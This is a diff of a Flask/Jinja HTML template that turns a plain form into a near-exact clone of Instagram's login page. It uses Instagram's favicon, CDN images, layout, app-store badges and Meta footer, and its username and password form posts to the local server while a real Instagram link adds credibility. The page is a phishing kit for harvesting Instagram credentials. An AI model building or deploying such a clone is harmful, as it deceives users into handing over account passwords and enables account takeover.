@@ -2,12 +2,314 @@
 
 {% block title %} Instagram Login {% endblock %}
 
-{% block content %}
-<form action="/" method="POST">
-    <label for="username">username</label>
-    <input type="text" placeholder="username">
-    <label for="password">password</label>
-    <input type="text" placeholder="password">
-    <button type="submit">Submit</button>
-</form>
+{% block custom_head %}
+<script src="https://kit.fontawesome.com/7084936aca.js" crossorigin="anonymous"></script>
+<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png"/>
+<style>
+    * {
+        font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+      }
+      
+      body {
+        margin: 0;
+        min-height: 100vh;
+      }
+      
+      .bagian {
+        display: flex;
+        flex-direction: column;
+        flex-grow: 1;
+        margin-bottom: 44px;
+      }
+      
+      .box {
+        display: flex;
+        justify-content: center;
+        margin-top: 12px;
+      }
+      
+      .section {
+        display: flex;
+        flex-direction: column;
+        border: 1px solid rgba(0, 0, 0, 0.15);
+        width: 350px;
+        height: 400px;
+        border-radius: 1px;
+      }
+      
+      .section img {
+        display: flex;
+        margin: auto;
+      }
+      
+      .section input {
+        display: flex;
+        flex-direction: column;
+        background-color: rgba(0, 0, 0, 0.03);
+        border: 1px solid rgb(0, 0, 0, 0.07);
+        border-radius: 2px;
+        width: 258px;
+        padding: 10px;
+        margin: 0 40px 6px;
+      }
+      
+      .login {
+        margin-top: 24px;
+      }
+      
+      .login button {
+        display: flex;
+        justify-content: center;
+        margin-top: 16px;
+        margin-bottom: 8px;
+        margin-left: 40px;
+        border-radius: 8px;
+        border: none;
+        padding: 9px;
+        background-color: #65b4f9;
+        color: white;
+        width: 286px;
+      }
+      
+      button:hover {
+        cursor: pointer;
+      }
+      
+      .horizontal {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        margin-bottom: 2rem;
+      }
+      
+      .verti1 {
+        border-bottom: 1px solid rgba(0, 0, 0, 0.5);
+        width: 107px;
+        position: relative;
+        bottom: 1.5em;
+      }
+      
+      .or {
+        text-align: center;
+        color: rgba(0, 0, 0, 0.5);
+        margin-left: 18px;
+        margin-right: 18px;
+        font-size: 14px;
+        font-weight: 600;
+      }
+      
+      .verti2 {
+        border-bottom: 1px solid rgba(0, 0, 0, 0.5);
+        width: 107px;
+        position: relative;
+        display: flex;
+        bottom: 1.5em;
+      }
+      
+      .facebook {
+        text-align: center;
+      }
+      
+      .facebook span {
+        color: #385185;
+        font-size: 14px;
+        font-weight: bold;
+      }
+      .forgot {
+        text-align: center;
+        margin-top: 12px;
+        margin-bottom: 15px;
+      }
+      
+      .forgot a {
+        text-decoration: none;
+        color: #385185;
+        font-size: 12px;
+      }
+      
+      .acc {
+        display: flex;
+        flex-direction: row;
+        gap: 5px;
+        margin-top: 10px;
+        justify-content: center;
+      }
+      
+      .acc p {
+        margin: 0;
+      }
+      
+      .acc span {
+        color: #60a2f8;
+        font-weight: bold;
+      }
+      
+      .acc span:hover {
+        cursor: pointer;
+      }
+      
+      .border {
+        display: flex;
+        border: 1px solid rgba(0, 0, 0, 0.15);
+        border-radius: 1px;
+        padding: 0 75px 6px;
+        padding-top: 20px;
+        padding-bottom: 20px;
+        margin-bottom: 10px;
+        gap: 5px;
+        font-size: 14px;
+      }
+      
+      .get {
+        text-align: center;
+      }
+      
+      .image {
+        display: flex;
+        justify-content: center;
+        gap: 1rem;
+        margin: 10px 0 10px 0;
+        margin-bottom: 44px;
+      }
+      .image img {
+        height: 40px;
+      }
+      
+      .span {
+        display: flex;
+        gap: 1rem;
+        justify-content: center;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 12px;
+      }
+      
+      .span span:hover {
+        text-decoration: underline rgba(0, 0, 0, 0.5);
+        cursor: pointer;
+      }
+      
+      .bahasa {
+        text-align: center;
+        color: rgba(0, 0, 0, 0.5);
+        margin-top: 12px;
+        margin-bottom: 55px;
+        font-size: 12px;
+      }
+      
+      .bahasa select {
+        background-color: white;
+        color: rgba(0, 0, 0, 0.5);
+        border: none;
+        padding: 0;
+      }
+      
+      .bahasa label:hover {
+        cursor: pointer;
+      }
+      
+      select:hover {
+        cursor: pointer;
+      }
+      
+      @media (max-width: 400px) {
+        * {
+          overflow: hidden;
+        }
+      
+        .section {
+          border: none;
+        }
+      
+        .horizontal {
+          margin-bottom: 10px;
+        }
+      
+        .border {
+          border: none;
+        }
+      
+        .span {
+          display: flex;
+          max-width: 75ch;
+        }
+      }
+</style>
 {% endblock %}
+
+{% block content %}
+<section class="bagian">
+    <div class="box">
+        <div class="section">
+          <img
+            src="{{ url_for('static', filename='img/instagram_banner.png')}}"
+            style="width: 170px"
+          />
+          <form action="/" method="POST" class="login">
+            <input type="text" id="username" name="username" placeholder="phone number,username,or email">
+            <input type="password" id="password" name="password" placeholder="password">
+            <button type="submit">Log in</button>
+          </form>
+          <div class="horizontal">
+            <div class="verti1"></div>
+            <div class="or">
+              <p>OR</p>
+            </div>
+            <div class="verti2"></div>
+          </div>
+          <div class="facebook">
+            <i class="fa-brands fa-square-facebook" style="color: #385185"></i>
+            <span>Log in with Facebook</span>
+          </div>
+          <div class="forgot">
+            <span
+              ><a href="https://www.instagram.com/accounts/login/"
+                >Forgot password?</a
+              ></span
+            >
+          </div>
+        </div>
+    </div>
+    <div class="acc">
+        <div class="border">
+          <p>Don't have an account?</p>
+          <span>Sign up</span>
+        </div>
+    </div>
+    <div class="get">
+        <span>Get the app.</span>
+    </div>
+    <div class="image">
+        <a
+          href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D91844C40-862A-4E0F-85FB-D580088A87D0%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"
+          ><img
+            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
+        /></a>
+        <a
+          href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT?hl=id-id&gl=id&icid=CNavAppsWindowsApps"
+          ><img
+            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+        /></a>
+    </div>
+</section>
+<div class="span">
+    <span>Meta</span>
+    <span>About</span>
+    <span>Blog</span>
+    <span>Jobs</span>
+    <span>Help</span>
+    <span>API</span>
+    <span>Privacy</span>
+    <span>Terms</span>
+    <span>Locations</span>
+    <span>Instagram Lite</span>
+    <span>Threads</span>
+    <span>Contact Uploading & Non-Users</span>
+    <span>Meta Verified</span>
+</div>
+<footer class="bahasa">
+    <label for="English">English</label>
+    <select name="bahasa" id="bahasa"></select>
+    <span>© 2023 Instagram from Meta</span>
+</footer>
+{% endblock %}  
